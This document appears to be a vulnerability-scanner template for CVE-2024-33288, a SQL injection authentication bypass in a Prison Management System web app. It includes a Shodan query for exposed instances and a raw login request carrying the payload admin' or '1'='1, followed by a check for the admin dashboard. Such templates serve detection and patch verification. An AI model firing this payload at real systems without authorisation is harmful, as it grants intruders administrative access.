id: CVE-2024-33288

info:
  name: Prison Management System - SQL Injection Authentication Bypass
  author: s4e-io
  severity: high
  description: |
    Sql injection vulnerability was found on the login page in Prison Management System
  impact: |
    Attackers can bypass authentication via SQL injection to gain unauthorized administrative access to the Prison Management System.
  remediation: |
    Apply security patches for Prison Management System addressing SQL injection vulnerabilities.
  reference:
    - https://en.0day.today/exploit/39610
    - https://www.sourcecodester.com/sql/17287/prison-management-system.html
  classification:
    cpe: cpe:2.3:a:prison_management_system_project:prison_management_system:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: prison_management_system_project
    product: prison_management_system
    shodan-query: title:"Prison Management System"
  tags: cve,cve2024,cms,sqli,vuln

http:
  - raw:
      - |
        POST /Admin/login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        txtusername=admin%27+or+%271%27+%3D%271&txtpassword={{randstr}}&btnlogin=
      - |
        GET /Admin/index.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<p>Change Password</p>"
          - "<p>Logout</p>"
          - "Admin Dashboard | Prison Management system"
        condition: and

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100d8fb4322139f3e88e6293d7f4de1344423344b2626f15e05e7d09f8f22eb1c04022100b17557c1a4680bbf82d9648833b25c00f7591c9e94ecfa146daf1788111af884:922c64590222798bb761d5b6d8e72950